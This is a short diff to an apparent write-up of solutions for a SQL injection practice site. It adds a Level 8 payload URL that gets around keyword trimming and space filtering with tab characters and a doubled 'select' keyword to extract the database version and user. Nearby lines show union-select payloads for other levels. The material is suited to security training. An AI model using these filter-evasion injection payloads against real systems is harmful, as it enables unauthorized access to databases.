@@ -32,6 +32,14 @@ http://www.zixem.altervista.org/SQLi/level4.php?ebookid=999%27%20union%20select%
 view-source:http://www.zixem.altervista.org/SQLi/level7.php?id=1111111%20union%20select%201,concat_ws(0x3a,%20version(),user()),2--+
 ```
 
+## LEVEL 8
+
+SELECT is trimmed, spaces are banned, comments are banned
+
+```
+http://www.zixem.altervista.org/SQLi/lvl8.php?id=11111111111111111111111%09union%09selselectect%09version(),user(),2
+```
+
 ## LEVEL 9
 
 ```
